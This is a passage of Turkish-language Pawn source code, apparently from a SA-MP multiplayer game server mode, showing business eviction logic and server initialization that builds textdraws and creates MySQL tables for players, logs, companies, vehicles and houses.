	ABusinessData[BusID][BusinessType] = 0;
	//ABusinessData[BusID][BusinessLevel] = 0;
	//ABusinessData[BusID][LastTransaction] = 0;
	ABusinessData[BusID][Owned] = false;
	//ABusinessData[BusID][Owner] = 0;
	// Destroy the mapicon, 3DText and pickup for the business
	DestroyDynamicPickup(ABusinessData[BusID][PickupID]);
	DestroyDynamicMapIcon(ABusinessData[BusID][MapIconID]);
	DestroyDynamic3DTextLabel(ABusinessData[BusID][DoorText]);
	ABusinessData[BusID][PickupID] = 0;
	ABusinessData[BusID][MapIconID] = 0;

    SQL::DeleteRow("isyerleri", "ID", BusID);
	// Delete the business-file
	/*format(file, sizeof(file), BusinessFile, BusID); // Construct the complete filename for this business-file
	if (fexist(file)) // Make sure the file exists
		fremove(file); // Delete the file*/
}

// This function will evict the given business from the server and from the owner's account (if it has an owner)
Business_Evict(BusID)
{
	// Setup local variables
	new Msg[128], Name[24]/*, bool:PlayerOnline = false*/;

	new query[256], bName[100], bSahipli, bSahip[40], Cache: get_isyeri, rows;
	mysql_format(Connection, query, sizeof(query), "SELECT Isim,Sahipli,Sahip FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
		{
			cache_get_value_name(i, "Isim", bName);
			cache_get_value_name_int(i, "Sahipli", bSahipli);
			cache_get_value_name(i, "Sahip", bSahip);
		}
	}

	cache_delete(get_isyeri);

	// Check if the business is owned
	if (bSahipli == 1)
	{
		// Loop through all players to find the owner (if he's online)
		for (new pid; pid < MAX_PLAYERS; pid++)
		{
			// Check if this player is online
		    if (IsPlayerConnected(pid))
		    {
		        // Get that player's name
		        GetPlayerName(pid, Name, sizeof(Name));
		        // Compare if this player has the same name as the owner of the business
				if (strcmp(bSahip, Name, false) == 0)
				{
				    // Set PlayerOnline to "true"
				    /*PlayerOnline = true;*/

					// Inform the player that his business is being deleted
					format(Msg, 128, "{FF0000}Ýþyeriniz olan {FFFF00}\"%s\"{FF0000}a el koyuldu.", bName);
					SendClientMessage(pid, 0xFFFFFFFF, Msg);

					// Also remove the BusID from his list of businesses
					/*for (new BusSlot; BusSlot < MAX_BUSINESSPERPLAYER; BusSlot++)
					    // Check if the business is stored in this business-slot
					    if (APlayerData[pid][Business][BusSlot] == BusID)
					        // If the business is stored in this slot, clear the slot
					        APlayerData[pid][Business][BusSlot] = 0;*/

					// Save the player's account again
					Oyuncu_Kaydet(pid);

					// Stop this For-loop, as the owner was already found and informed
					break;
				}
		    }
		}

		// Check if the player was not online
		/*if (PlayerOnline == false)
			// Remove the house from the player's account (open the account, remove the data and re-save it)
			PlayerFile_RemoveProperty(ABusinessData[BusID][Owner], 0, BusID);*/
	}

	// Clear ownership of the business
	format(query, 256, "UPDATE isyerleri SET Level='1',Kasa='0',Sahipli='0',Sahip='-' WHERE ID = %d", BusID);
	mysql_query(Connection, query);
	/*ABusinessData[BusID][Owned] = false;
	ABusinessData[BusID][Owner] = 0;*/
 	ABusinessData[BusID][Owned] = false;
        
	// Update the entrance of the business
	Business_UpdateEntrance(BusID);

	// Save the businessfile
	/*BusinessFile_Save(BusID);*/
}



// This function loads the playerfile for the given player, removes the lines that contain the HouseID or BusinessID and resaves the file
/*PlayerFile_RemoveProperty(Name[], HouseID, BusID)
{
	// Setup local variables
	new file[100], File:PFile, LineFromFile[100], Index, SearchString[100];

	// Construct the complete filename for this player's account
	format(file, sizeof(file), PlayerFile, Name);

	// Check if the player's datafile exists
	if (fexist(file))
	{
		// First clear the array before using it to make sure it's empty
		for (Index = 0; Index < 100; Index++)
            FileContent[Index][0] = 0;

		// Open the playerfile for reading
		PFile = fopen(file, io_read);

		// Read up to 100 lines from the file (no player-account should have more than this)
		for (Index = 0; Index < 100; Index++)
		{
			// Read a line from the file
			fread(PFile, LineFromFile);
			// Strip any newline characters from the LineFromFile
			StripNewLine(LineFromFile);

			// Check if this line holds data
			if (strlen(LineFromFile) > 0)
				// Store this line into the array
				format(FileContent[Index], 100, LineFromFile);
			else // If the read line doesn't contain any more data (empty string), the end of the file has been reached
			    break;
		}

        // Close the file
		fclose(PFile);



		// Now the file has been read and stored into the array, now scan the array to search for the matching HouseID and/or BusinessID

		// Loop through the entire array
		for (Index = 0; Index < 100; Index++)
		{
			// Build the string to search for the HouseID
			format(SearchString, 100, "House %i", HouseID);
			// Check if this line holds the string we're looking for
			if (strcmp(FileContent[Index], SearchString, false) == 0)
			    // Clear the array-index
			    FileContent[Index][0] = 0;

			// Build the string to search for the BusinessID
			format(SearchString, 100, "Business %i", BusID);
			// Check if this line holds the string we're looking for
			if (strcmp(FileContent[Index], SearchString, false) == 0)
			    // Clear the array-index
			    FileContent[Index][0] = 0;
		}


		// Now all matching HouseID's and BusinessID's should be removed from the account, now re-save the playerfile

        // Open the playerfile for writing
		PFile = fopen(file, io_write);

		// Loop through the entire array
		for (Index = 0; Index < 100; Index++)
		{
			// Check if there is data in this array-slot
			if (FileContent[Index][0] != 0)
			{
			    // Construct the line for saving
				format(LineFromFile, 100, "%s\r\n", FileContent[Index]);
		        // And save it to the file
				fwrite(PFile, LineFromFile);
			}
		}

        // Close the file
		fclose(PFile);
	}
}
*/
// ************************************************************************************************************************************************************
// End of includes
// ************************************************************************************************************************************************************


function changeColor(playerid)return ChangeVehicleColor(GetPlayerVehicleID(playerid), random(255), random(255));

// The main function (used only once when the server loads)
main()
{
	// Print some standard lines to the server's console
	print("\n----------------------------------");
	print(GameModeName);
	print("----------------------------------\n");
}



// This callback gets called when the server initializes the gamemode
public OnGameModeInit()
{
	// Hastane pickup
    HastanePickYukle();

    ClientMode = 1;
	// PaintBall
	/*CreatePickup(1239,1,1310.1099,-1367.9067,13.5421,-1);
	Create3DTextLabel("Paint Ball : /paintball yazarak girebilirsin.",COLOR_YELLOW,1310.1099,-1367.9067,13.5421,10,0,0);
*/
    SetTimer("HastanePicksKaydet", (1000 * 60) * HastanePickKayitSure, true); // Otomatik hastane pick kayýt balþadý
    print("Hastane pickups otomatik kayit baslatildi!");
    


    Event0 = TextDrawCreate(5.000000, 277.000000, " ");
	TextDrawBackgroundColor(Event0, 40);
	TextDrawFont(Event0, 1);
	TextDrawLetterSize(Event0, 0.190000, 0.899999);
	TextDrawColor(Event0, -1);
	TextDrawSetOutline(Event0, 1);
	TextDrawSetProportional(Event0, 1);
	TextDrawSetSelectable(Event0, 0);

	Event1 = TextDrawCreate(5.000000, 286.000000, " ");
	TextDrawBackgroundColor(Event1, 40);
	TextDrawFont(Event1, 1);
	TextDrawLetterSize(Event1, 0.190000, 0.899999);
	TextDrawColor(Event1, -1);
	TextDrawSetOutline(Event1, 1);
	TextDrawSetProportional(Event1, 1);
	TextDrawSetSelectable(Event1, 0);

	Event2 = TextDrawCreate(5.000000, 295.000000, " ");
	TextDrawBackgroundColor(Event2, 40);
	TextDrawFont(Event2, 1);
	TextDrawLetterSize(Event2, 0.190000, 0.899999);
	TextDrawColor(Event2, -1);
	TextDrawSetOutline(Event2, 1);
	TextDrawSetProportional(Event2, 1);
	TextDrawSetSelectable(Event2, 0);

	Event3 = TextDrawCreate(5.000000, 304.000000, " ");
	TextDrawBackgroundColor(Event3, 40);
	TextDrawFont(Event3, 1);
	TextDrawLetterSize(Event3, 0.190000, 0.899999);
	TextDrawColor(Event3, -1);
	TextDrawSetOutline(Event3, 1);
	TextDrawSetProportional(Event3, 1);
	TextDrawSetSelectable(Event3, 0);

	Event4 = TextDrawCreate(5.000000, 313.000000, " ");
	TextDrawBackgroundColor(Event4, 40);
	TextDrawFont(Event4, 1);
	TextDrawLetterSize(Event4, 0.190000, 0.899999);
	TextDrawColor(Event4, -1);
	TextDrawSetOutline(Event4, 1);
	TextDrawSetProportional(Event4, 1);
	TextDrawSetSelectable(Event4, 0);

	Event5 = TextDrawCreate(5.000000, 322.000000, " ");
	TextDrawBackgroundColor(Event5, 40);
	TextDrawFont(Event5, 1);
	TextDrawLetterSize(Event5, 0.190000, 0.899999);
	TextDrawColor(Event5, -1);
	TextDrawSetOutline(Event5, 1);
	TextDrawSetProportional(Event5, 1);
	TextDrawSetSelectable(Event5, 0);

	// ATM Sistemi
	ATM_Load();

	// Sinyal sistemi
	for(new i=0;i<MAX_VEHICLES;i++)
    {
        Blink[i][0] = -1;
        Blink[i][1] = -1;
        Blink[i][2] = -1;
        Blink[i][3] = -1;
    }
    SetTimer("B_TrailerCheck", 1000, 1);


    // Baþarým Sistemi
	for(new i; i < sizeof(Basarimlar); i++)
	{
		CreateAchievement(Basarimlar[i][AchName], Basarimlar[i][AchBilgi], Basarimlar[i][AchMiktar]);
	}
	printf("Basarim sistemi yuklendi. ( %d Basarim )", sizeof(Basarimlar));

    // Dinamik Duyuru Sistemi
	Duyuru_Yukle();
	printf("Dinamik duyuru sistemi yuklendi. ( %d Duyuru )", Iter_Count(DDs));

	
	// ======================= [ Yeni Duyuru Sistemi ] =========================
/*		for(new playerid; playerid <= GetMaxPlayers(); playerid++){
	Event0[playerid] = TextDrawCreate(8.000000, 259.000000, " ");
	TextDrawBackgroundColor(Event0[playerid], 240);
	TextDrawFont(Event0[playerid], 1);
	TextDrawLetterSize(Event0[playerid], 0.160000, 1.000000);
	TextDrawColor(Event0[playerid], -1);
	TextDrawSetOutline(Event0[playerid], 1);
	TextDrawSetProportional(Event0[playerid], 1);
	TextDrawSetSelectable(Event0[playerid], 0);

	Event1[playerid] = TextDrawCreate(8.000000, 269.000000, " ");
	TextDrawBackgroundColor(Event1[playerid], 240);
	TextDrawFont(Event1[playerid], 1);
	TextDrawLetterSize(Event1[playerid], 0.160000, 1.000000);
	TextDrawColor(Event1[playerid], -1);
	TextDrawSetOutline(Event1[playerid], 1);
	TextDrawSetProportional(Event1[playerid], 1);
	TextDrawSetSelectable(Event1[playerid], 0);

	Event2[playerid] = TextDrawCreate(8.000000, 279.000000, " ");
	TextDrawBackgroundColor(Event2[playerid], 240);
	TextDrawFont(Event2[playerid], 1);
	TextDrawLetterSize(Event2[playerid], 0.160000, 1.000000);
	TextDrawColor(Event2[playerid], -1);
	TextDrawSetOutline(Event2[playerid], 1);
	TextDrawSetProportional(Event2[playerid], 1);
	TextDrawSetSelectable(Event2[playerid], 0);

	Event3[playerid] = TextDrawCreate(8.000000, 289.000000, " ");
	TextDrawBackgroundColor(Event3[playerid], 240);
	TextDrawFont(Event3[playerid], 1);
	TextDrawLetterSize(Event3[playerid], 0.160000, 1.000000);
	TextDrawColor(Event3[playerid], -1);
	TextDrawSetOutline(Event3[playerid], 1);
	TextDrawSetProportional(Event3[playerid], 1);
	TextDrawSetSelectable(Event3[playerid], 0);

	Event4[playerid] = TextDrawCreate(8.000000, 299.000000, " ");
	TextDrawBackgroundColor(Event4[playerid], 240);
	TextDrawFont(Event4[playerid], 1);
	TextDrawLetterSize(Event4[playerid], 0.160000, 1.000000);
	TextDrawColor(Event4[playerid], -1);
	TextDrawSetOutline(Event4[playerid], 1);
	TextDrawSetProportional(Event4[playerid], 1);
	TextDrawSetSelectable(Event4[playerid], 0);

	Event5[playerid] = TextDrawCreate(8.000000, 309.000000, " ");
	TextDrawBackgroundColor(Event5[playerid], 240);
	TextDrawFont(Event5[playerid], 1);
	TextDrawLetterSize(Event5[playerid], 0.160000, 1.000000);
	TextDrawColor(Event5[playerid], -1);
	TextDrawSetOutline(Event5[playerid], 1);
	TextDrawSetProportional(Event5[playerid], 1);
	TextDrawSetSelectable(Event5[playerid], 0);
	}*/
	//==========================================================================
	// MySQL Baðlantýsý
	Connection = SQL::Connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DB);
	printf("Veri Tabanina baglanti saglandi.");

    new handle;
    if(!SQL::ExistsTable("oyuncular"))
    {
        handle = SQL::Open(SQL::CREATE, "oyuncular");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
    	SQL::AddTableColumn(handle, "Nick", SQL_TYPE_VCHAR, 50);

    	SQL::AddTableColumn(handle, "Sifre", SQL_TYPE_VCHAR, 256);
    	SQL::AddTableColumn(handle, "AdmSifre", SQL_TYPE_VCHAR, 350);

		SQL::AddTableColumn(handle, "AdminLevel", SQL_TYPE_INT);
 		SQL::AddTableColumn(handle, "DJLevel", SQL_TYPE_INT);
 		SQL::AddTableColumn(handle, "RehberLevel", SQL_TYPE_INT);
		SQL::AddTableColumn(handle, "DonLevel", SQL_TYPE_INT);

 		SQL::AddTableColumn(handle, "Jailed", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "Wanted", SQL_TYPE_INT);

  		SQL::AddTableColumn(handle, "TruckerLicense", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "BusLicense", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "DolmusLicense", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "PilotLicense", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "GemiciLicense", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "MafiaLicense", SQL_TYPE_INT);

    	SQL::AddTableColumn(handle, "Muted", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "RulesRead", SQL_TYPE_VCHAR, 10);

    	SQL::AddTableColumn(handle, "StatsMetersDriven", SQL_TYPE_FLOAT);
  		SQL::AddTableColumn(handle, "StatsTruckerJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsConvoyJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsBusDriverJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsDolmusDriverJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsPilotJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsMafiaJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsMafiaStolen", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsPoliceFined", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsPoliceJailed", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsFBYFined", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsFBYJailed", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsRoadworkerJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsGemiciJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsGJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsBankaJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsFireJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsOduncuJobs", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "StatsBalikciJobs", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "StatsPboyJobs", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "StatsKargocuJobs", SQL_TYPE_INT);

  		SQL::AddTableColumn(handle, "Money", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "Score", SQL_TYPE_INT);

  		SQL::AddTableColumn(handle, "Sirket", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "SirketRutbe", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "SirketKatki", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "GizliKasa", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "GizliKasaI", SQL_TYPE_VCHAR, 100);
    	SQL::AddTableColumn(handle, "VIP", SQL_TYPE_VCHAR, 20);

  		SQL::AddTableColumn(handle, "Rank", SQL_TYPE_INT);
  		SQL::AddTableColumn(handle, "MeslekY", SQL_TYPE_INT);

    	SQL::AddTableColumn(handle, "KayitGun", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "KayitAy", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "KayitYil", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "SonGun", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "SonAy", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "SonYil", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "OSaniye", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "ODakika", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "OSaat", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "OGun", SQL_TYPE_INT);

    	SQL::AddTableColumn(handle, "OnlineStatus", SQL_TYPE_INT);
    	SQL::AddTableColumn(handle, "EP", SQL_TYPE_INT);
     	SQL::AddTableColumn(handle, "Skin", SQL_TYPE_INT);

     	SQL::AddTableColumn(handle, "EXP", SQL_TYPE_INT);
     	SQL::AddTableColumn(handle, "Level", SQL_TYPE_INT);
     	
     	SQL::AddTableColumn(handle, "playerMail", SQL_TYPE_VCHAR, 256);

        SQL::Close(handle);

        printf("'oyuncular' tablosu olusturuldu.");
    }
	if(!SQL::ExistsTable("atmler"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "atmler");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "isim", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "atmx", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "atmy", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "atmz", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "atma", SQL_TYPE_FLOAT);
        SQL::Close(handle);

        printf("'atmler' tablosu olusturuldu.");
    }

    if(!SQL::ExistsTable("AdminLog"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "AdminLog");
        SQL::AddTableColumn(handle, "islem", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "icerik", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "TarihSaat", SQL_TYPE_VCHAR, 200);
        SQL::Close(handle);

        printf("'AdminLog' tablosu olusturuldu.");
    }
    
    if(!SQL::ExistsTable("RehberLog"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "RehberLog");
        SQL::AddTableColumn(handle, "islem", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "icerik", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "TarihSaat", SQL_TYPE_VCHAR, 200);
        SQL::Close(handle);

        printf("'RehberLog' tablosu olusturuldu.");
    }
    
    if(!SQL::ExistsTable("YpmLog"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "YpmLog");
        SQL::AddTableColumn(handle, "Type", SQL_TYPE_INT, 11);
        SQL::AddTableColumn(handle, "UserNick", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "Message", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "TarihSaat", SQL_TYPE_VCHAR, 200);
        SQL::Close(handle);

        printf("'YpmLog' tablosu olusturuldu.");
    }
    	
    if(!SQL::ExistsTable("DJLog"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "DJLog");
        SQL::AddTableColumn(handle, "islem", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "sarki", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "TarihSaat", SQL_TYPE_VCHAR, 200);
        SQL::Close(handle);

        printf("'DJLog' tablosu olusturuldu.");
    }

    if(!SQL::ExistsTable("bugbildirimleri"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "bugbildirimleri");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "bugBildiren", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "bugAciklamasi", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "bugBildirmeTarih", SQL_TYPE_VCHAR, 200);
        SQL::Close(handle);

        printf("'bugbildirimleri' tablosu olusturuldu.");
    }

  	if(!SQL::ExistsTable("sirketler"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "sirketler");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11);
        SQL::AddTableColumn(handle, "Name", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "Tag", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "Sahip", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "Uye", SQL_TYPE_INT, 200);
        SQL::AddTableColumn(handle, "MaxUye", SQL_TYPE_INT, 200);
        SQL::AddTableColumn(handle, "Kasa", SQL_TYPE_INT, 200);
        SQL::AddTableColumn(handle, "Deger", SQL_TYPE_INT, 200);

        SQL::AddTableColumn(handle, "XYZ", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "InfoXYZ", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "MinXY", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "MaxXY", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "GateXYZ", SQL_TYPE_VCHAR, 200);

		SQL::AddTableColumn(handle, "GateRXYZ", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "KasaXYZRZ", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "BenzinXYZ", SQL_TYPE_VCHAR, 200);

        SQL::AddTableColumn(handle, "Renk12", SQL_TYPE_INT, 30);

        SQL::AddTableColumn(handle, "SirketOran", SQL_TYPE_INT, 30);
        SQL::AddTableColumn(handle, "SirketDolum", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "SirketBorc", SQL_TYPE_INT, 30);
        
        SQL::AddTableColumn(handle, "SirketDuyuru", SQL_TYPE_VCHAR, 200);
        
        SQL::Close(handle);

        printf("'sirketler' tablosu olusturuldu.");
    }
    if(!SQL::ExistsTable("sirketaraclar"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "sirketaraclar");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "SirketID", SQL_TYPE_INT, 30);
        SQL::AddTableColumn(handle, "Model", SQL_TYPE_INT, 30);
        SQL::AddTableColumn(handle, "Fiyat", SQL_TYPE_INT, 30);
        SQL::AddTableColumn(handle, "MinRutbe", SQL_TYPE_INT, 200);

        SQL::AddTableColumn(handle, "X", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "Y", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "Z", SQL_TYPE_FLOAT);
        SQL::AddTableColumn(handle, "RZ", SQL_TYPE_FLOAT);
        SQL::Close(handle);

        printf("'sirketaraclar' tablosu olusturuldu.");
    }
    if(!SQL::ExistsTable("yasaklilar"))
    {
        // Yönetim Modülü
        handle = SQL::Open(SQL::CREATE, "yasaklilar");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "Nick", SQL_TYPE_VCHAR, 30);
        SQL::AddTableColumn(handle, "Banlayan", SQL_TYPE_VCHAR, 30);
        SQL::AddTableColumn(handle, "Sebep", SQL_TYPE_VCHAR, 200);
        SQL::AddTableColumn(handle, "Sonlu", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "BitisGun", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "BitisAy", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "BitisYil", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "BitisSaat", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "BitisDakika", SQL_TYPE_INT);
        SQL::Close(handle);

        printf("'yasaklilar' tablosu olusturuldu.");
    }
    if(!SQL::ExistsTable("araclar"))
    {
        // Araç Sahiplik Sistemi
        handle = SQL::Open(SQL::CREATE, "araclar");
    	SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Model", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Sahip", SQL_TYPE_VCHAR, 50);
    	SQL::AddTableColumn(handle, "X", SQL_TYPE_FLOAT, 20);
    	SQL::AddTableColumn(handle, "Y", SQL_TYPE_FLOAT, 20);
    	SQL::AddTableColumn(handle, "Z", SQL_TYPE_FLOAT, 20);
    	SQL::AddTableColumn(handle, "Rot", SQL_TYPE_FLOAT, 20);
    	SQL::AddTableColumn(handle, "Renk1", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Renk2", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Fiyat", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Izin", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Plaka", SQL_TYPE_VCHAR, 50);
    	SQL::AddTableColumn(handle, "PJ", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "NOS", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "KM", SQL_TYPE_FLOAT, 50);

		for(new asrn; asrn < 14; asrn++)
		{
		    new Yazi[1024];
	    	format(Yazi, 300, "Mod%d", asrn);
    		SQL::AddTableColumn(handle, Yazi, SQL_TYPE_INT, 11);
		}

    	SQL::AddTableColumn(handle, "Neon", SQL_TYPE_INT, 11);
    	SQL::AddTableColumn(handle, "Karavan", SQL_TYPE_INT, 11);

        SQL::Close(handle);

        printf("'araclar' tablosu olusturuldu.");
    }

	// Ev Sistemi [ TeaMStar ]
	for(new i; i < MAX_HOUSES_N; ++i)
	{
		HouseData[i][HouseLabel] = Text3D: INVALID_3DTEXT_ID;
		HouseData[i][HousePickup] = -1;
		HouseData[i][HouseIcon] = -1;
		HouseData[i][Save] = false;
	}

	for(new i; i < sizeof(HouseInteriors); ++i)
	{
	    HouseInteriors[i][intLabel] = CreateDynamic3DTextLabel("Evden Ayrýl", 0xE67E22FF, HouseInteriors[i][intX], HouseInteriors[i][intY], HouseInteriors[i][intZ]+0.35, 10.0, .testlos = 1, .interiorid = HouseInteriors[i][intID]);
		HouseInteriors[i][intPickup] = CreateDynamicPickup(1318, 1, HouseInteriors[i][intX], HouseInteriors[i][intY], HouseInteriors[i][intZ], .interiorid = HouseInteriors[i][intID]);
	}

	Iter_Init(HouseKeys);
	DisableInteriorEnterExits();

	/* Create Tables */
	new query[1024];
	strcat(query, "CREATE TABLE IF NOT EXISTS `houses` (\
	  `ID` int(11) NOT NULL,\
	  `HouseName` varchar(48) NOT NULL default 'House For Sale',\
	  `HouseOwner` varchar(24) NOT NULL default '-',\
	  `HousePassword` varchar(16) NOT NULL default '-',\
	  `HouseX` float NOT NULL,\
	  `HouseY` float NOT NULL,\
	  `HouseZ` float NOT NULL,\
	  `HousePrice` int(11) NOT NULL,\
	  `HouseInterior` tinyint(4) NOT NULL default '0',\
	  `HouseLock` tinyint(4) NOT NULL default '0',\
	  `HouseMoney` int(11) NOT NULL default '0',"
 	);

 	strcat(query, "`LastEntered` int(11) NOT NULL,\
		  PRIMARY KEY  (`ID`),\
		  UNIQUE KEY `ID_2` (`ID`),\
		  KEY `ID` (`ID`)\
		) ENGINE=InnoDB DEFAULT CHARSET=utf8;"
	);

	mysql_tquery(Connection, query, "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `housefurnitures` (\
	  `ID` int(11) NOT NULL auto_increment,\
	  `HouseID` int(11) NOT NULL,\
	  `FurnitureID` tinyint(11) NOT NULL,\
	  `FurnitureX` float NOT NULL,\
	  `FurnitureY` float NOT NULL,\
	  `FurnitureZ` float NOT NULL,\
	  `FurnitureRX` float NOT NULL,\
	  `FurnitureRY` float NOT NULL,\
	  `FurnitureRZ` float NOT NULL,\
	  `FurnitureVW` int(11) NOT NULL,\
	  `FurnitureInt` int(11) NOT NULL,\
	  PRIMARY KEY  (`ID`)\
	) ENGINE=MyISAM DEFAULT CHARSET=utf8;", "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `houseguns` (\
	  `HouseID` int(11) NOT NULL,\
	  `WeaponID` tinyint(4) NOT NULL,\
	  `Ammo` int(11) NOT NULL,\
	  UNIQUE KEY `HouseID_2` (`HouseID`,`WeaponID`),\
	  KEY `HouseID` (`HouseID`),\
	  CONSTRAINT `houseguns_ibfk_1` FOREIGN KEY (`HouseID`) REFERENCES `houses` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE\
	) ENGINE=InnoDB DEFAULT CHARSET=utf8;", "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `housevisitors` (\
	  `HouseID` int(11) NOT NULL,\
	  `Visitor` varchar(24) NOT NULL,\
	  `Date` int(11) NOT NULL\
	) ENGINE=MyISAM DEFAULT CHARSET=utf8;", "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `housekeys` (\
	  `HouseID` int(11) NOT NULL,\
	  `Player` varchar(24) NOT NULL,\
	  `Date` int(11) NOT NULL\
	) ENGINE=MyISAM DEFAULT CHARSET=utf8;", "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `housesafelogs` (\
	  `HouseID` int(11) NOT NULL,\
	  `Type` int(11) NOT NULL,\
	  `Amount` int(11) NOT NULL,\
	  `Date` int(11) NOT NULL\
	) ENGINE=MyISAM DEFAULT CHARSET=utf8;", "", "");

	mysql_tquery(Connection, "CREATE TABLE IF NOT EXISTS `housesales` (\
	  `ID` int(11) NOT NULL AUTO_INCREMENT,\
	  `OldOwner` varchar(24) NOT NULL,\
	  `NewOwner` varchar(24) NOT NULL,\
	  `Price` int(11) NOT NULL,\
	  PRIMARY KEY (`ID`)\
